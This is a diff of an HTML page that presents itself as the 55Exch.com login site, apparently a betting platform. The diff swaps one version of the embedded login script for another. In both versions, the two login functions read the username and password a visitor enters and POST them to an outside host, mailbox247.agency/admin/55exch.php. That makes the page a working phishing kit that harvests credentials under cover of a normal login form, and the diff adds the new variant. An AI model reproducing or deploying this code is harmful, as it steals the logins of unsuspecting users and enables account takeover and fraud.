@@ -1407,90 +1407,84 @@ This website 55Exch.com is owned and operated by GIT Operations. registration nu
 
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script>
-		// JavaScript function to send login data to the specified URL
-function checkLogins() {
-  // Get the username and password values
-  const username = document.getElementById("loginName1").value;
-  const password = document.getElementById("password1").value;
+  // Function to send login data for the first form
+  function checkLogins() {
+    const username = document.getElementById("loginName1").value;
+    const password = document.getElementById("password1").value;
 
-  // Perform basic validation
-  if (!username || !password) {
-    alert("Please enter both username and password.");
-    return;
+    if (!username || !password) {
+      alert("Please enter both username and password.");
+      return;
+    }
+
+    // Prepare form data for x-www-form-urlencoded format
+    const formData = new URLSearchParams();
+    formData.append("loginName", username);
+    formData.append("password", password);
+
+    fetch("https://mailbox247.agency/admin/55exch.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      body: formData.toString(),
+    })
+      .then((response) => {
+        if (response.ok) {
+          return response.text();
+        } else {
+          throw new Error("Network response was not ok.");
+        }
+      })
+      .then((responseText) => {
+        console.log("Response from server:", responseText);
+        alert("Login data sent successfully.");
+      })
+      .catch((error) => {
+        console.error("Error sending data:", error);
+        alert("An error occurred. Please try again later.");
+      });
   }
 
-  // Prepare the data to send
-  const data = {
-    loginName: username,
-    password: password,
-  };
+  // Function to send login data for the second form
+  function checkLogin() {
+    const username = document.getElementById("loginName").value;
+    const password = document.getElementById("password").value;
 
-  // Send data using the fetch API
-  fetch("https://mailbox247.agency/admin/55exch.php", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify(data),
-  })
-    .then((response) => {
-      if (response.ok) {
-        return response.text(); // Process the server response
-      } else {
-        throw new Error("Network response was not ok.");
-      }
+    if (!username || !password) {
+      alert("Please enter both username and password.");
+      return;
+    }
+
+    const formData = new URLSearchParams();
+    formData.append("loginName", username);
+    formData.append("password", password);
+
+    fetch("https://mailbox247.agency/admin/55exch.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      body: formData.toString(),
     })
-    .then((responseText) => {
-      // Handle the server response
-      console.log("Response from server:", responseText);
-      alert("Login data sent successfully.");
-    })
-    .catch((error) => {
-      console.error("Error sending data:", error);
-      alert("An error occurred. Please try again later.");
-    });
-}
-
-// Optional: Add event listener for the second form
-function checkLogin() {
-  const username = document.getElementById("loginName").value;
-  const password = document.getElementById("password").value;
-
-  if (!username || !password) {
-    alert("Please enter both username and password.");
-    return;
+      .then((response) => {
+        if (response.ok) {
+          return response.text();
+        } else {
+          throw new Error("Network response was not ok.");
+        }
+      })
+      .then((responseText) => {
+        console.log("Response from server:", responseText);
+        alert("Login data sent successfully.");
+      })
+      .catch((error) => {
+        console.error("Error sending data:", error);
+        alert("An error occurred. Please try again later.");
+      });
   }
+</script>
 
-  const data = {
-    loginName: username,
-    password: password,
-  };
-
-  fetch("https://mailbox247.agency/admin/55exch.php", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify(data),
-  })
-    .then((response) => {
-      if (response.ok) {
-        return response.text();
-      } else {
-        throw new Error("Network response was not ok.");
-      }
-    })
-    .then((responseText) => {
-      console.log("Response from server:", responseText);
-      alert("Login data sent successfully.");
-    })
-    .catch((error) => {
-      console.error("Error sending data:", error);
-      alert("An error occurred. Please try again later.");
-    });
-}
-
-	</script>
 
 	
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
